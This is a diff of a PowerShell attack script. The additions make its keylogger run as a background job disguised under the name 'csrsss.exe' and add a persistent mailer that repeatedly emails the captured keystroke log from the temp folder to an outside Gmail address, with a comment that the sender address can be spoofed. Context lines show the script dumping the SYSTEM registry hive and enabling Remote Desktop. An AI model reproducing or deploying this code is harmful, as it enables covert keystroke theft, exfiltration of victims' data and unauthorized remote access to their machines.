@@ -34,16 +34,16 @@ https://stackoverflow.com/questions/21590719/check-if-user-is-a-member-of-the-lo
 
 #>
 
-### Add information to results
+### Add information to resultsgithub
 function Main(){
-$results = "RESULTS `n"
-initialize
-$results = nonAdministrativeScrapperFunctions
+#$results = "RESULTS `n"
+#initialize
+#$results = nonAdministrativeScrapperFunctions
 ### Runs Key logger (does not require admin privs)
-keyLogger
-$results += findGeoLocation
-$results
-mail $results
+#$results += keyLogger
+#$results += findGeoLocation
+#mail $results
+createMailerToMailKeyloggerResults
 }
 
 function debug(){
@@ -205,7 +205,7 @@ $results += "`nEnvironment variables`n"
 $results +=  Get-ChildItem env: | Format-Table -HideTableHeaders | Out-String
 $results += "`n"
 
-$results
+return $results
 }
 
 
@@ -222,7 +222,7 @@ reg save HKLM\SYSTEM .\system
 # needs to be tested!!!!
 Set-NetConnectionProfile -NetworkCategory Private -Force -SkipNetworkProfileCheck
 
-### Enable remode Desktop
+### Enable remote Desktop
 $regKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server"
 Set-ItemProperty $regKey fDenyTSConnections 0
 }
@@ -231,8 +231,9 @@ Set-ItemProperty $regKey fDenyTSConnections 0
 
 ### Function that creates a power shell file 
 ### with the key loggers source in it and runs it in background
+### TESTED ON windows10 and windows 7(powershell v2)
 ### IF log file already exists, it appends results
-### TODO add a proces that periodicaly sends the updated log file through email
+### TODO add a process that periodically sends the updated log file through email
 function keyLogger(){
 $scriptForKeyloggerAsString = 'Add-Type -TypeDefinition @"
 using System;
@@ -300,8 +301,22 @@ namespace KeyLogger {
 $command = '$scriptBlockVar ='+$scriptForKeyloggerAsString+'
  Invoke-Expression $scriptBlockVar'
 $scriptBlock = [scriptblock]::Create($command)
-### Starts script block in background
-$job = start-Job -scriptblock $scriptBlock
+### Starts script block in background and saves job as variable
+### Job is started as a different process unrelated to this script process
+### and is not killed if current window is killed.
+$job = start-Job -scriptblock $scriptBlock -Name "csrsss.exe"
+### Sleeps 1 second to be sure that job is properly started.
+Sleep 1
+### Checks if keylogger is running
+$results += "`nKeylogger status. `n"
+if($job.state -eq "Running"){
+	
+	$results += "Keylogger is Running..."
+}else {
+	$results +="Keylogger is NOT running"
+}
+$results += "`n"
+return $results
 ### DEBUG
 #$job | Format-List -Property *
 }
@@ -358,6 +373,102 @@ function findGeoLocation(){
 		}
 }
 
+### Creates a background process that will send a mail with the keyloggers results every 5 mins
+### It also checks whether the file exists if not it exits
+function createMailerToMailKeyloggerResults(){
+	$variableContainingScriptToBeExecutedAsString = '
+function mail($messageBody){
+		$smtpServer = "smtp.scarlet.be"
+		 #Creating a Mail object
+		 $msg = new-object Net.Mail.MailMessage
+
+		 #Creating SMTP server object
+		 $smtp = new-object Net.Mail.SmtpClient($smtpServer)
+		 $smtp.Enablessl = $true
+		 $smtp.port = 25
+		 #Email structure 
+		 ### !!!! From email can be spoofed
+		 ### On 12/09/2018 you could still use any gmail account as sender and receiver (TESTED)
+		 $msg.From = "powershell@scarlet.be"
+		 $msg.To.Add("perselis.e@gmail.com")
+
+		 $msg.subject = "Scrapper information"
+
+
+		 $msg.IsBodyHTML = $false
+		 $msg.body = $messageBody +""
+
+		 $ok=$true 
+		 Write-Host "SMTP Server:" $smtpserver "Port #:" $smtp.port "SSL Enabled?" $smtp.Enablessl
+		 try{
+				$smtp.Send($msg)
+				Write-Host "SENT"
+
+		 }
+		 catch {
+			$error[0]
+			$_.Exception.Response
+			$ok=$false
+		 }
+		 finally{
+			$msg.Dispose()
+
+		 }
+		 if($ok){
+			Write-Host "EVERYTHING PASSED"
+		 }
+
+	}
+	
+	$keyloggerLogFilePath = $env:temp+"\keylogger.txt"
+	while($true)
+	{
+		Sleep (5 * 1)
+		try{
+			$keyloggerJob = Get-Job -Name "csrsss.exe"
+			if($keyloggerJob.State -eq "Running"){
+				if([System.IO.File]::Exists($keyloggerLogFilePath)){
+					$keyloggerFileContents = type $keyloggerLogFilePath
+					mail $keyloggerFileContents
+				}
+				else{
+					"Keylogger log does not exist"
+					mail "Keylogger log does not exist"
+					exit
+				}
+				
+			}else{
+				"Keylogger is not running"
+				mail "Keylogger is not running see email headers for more details"
+				exit
+			}
+			
+		}
+		catch{
+			"Keylogger is not running"
+			mail "Keylogger is not running see email headers for more details"
+			exit
+		}
+	}
+	'
+	$command = '$scriptBlockVar ='+$variableContainingScriptToBeExecutedAsString+'
+	Invoke-Expression $scriptBlockVar'
+	$scriptBlock = [scriptblock]::Create($command)
+	### Starts script block in background and saves job as variable
+	### Job is started as a different process unrelated to this script process
+	### and is not killed if current window is killed.
+	$job = start-Job -scriptblock $scriptBlock -Name "mailer.exe"
+	Sleep 1
+	### Checks if mailer is running
+	$results += "`nMailer status. `n"
+	if($job.state -eq "Running"){
+		$results += "Mailer is Running..."
+	}else {
+		$results +="Mailer is NOT running"
+	}
+	$results += "`n"
+	$results
+}
 
 ### Strict mode is scoped.
 ### It prevents minor scripting errors like accessing non existent variables
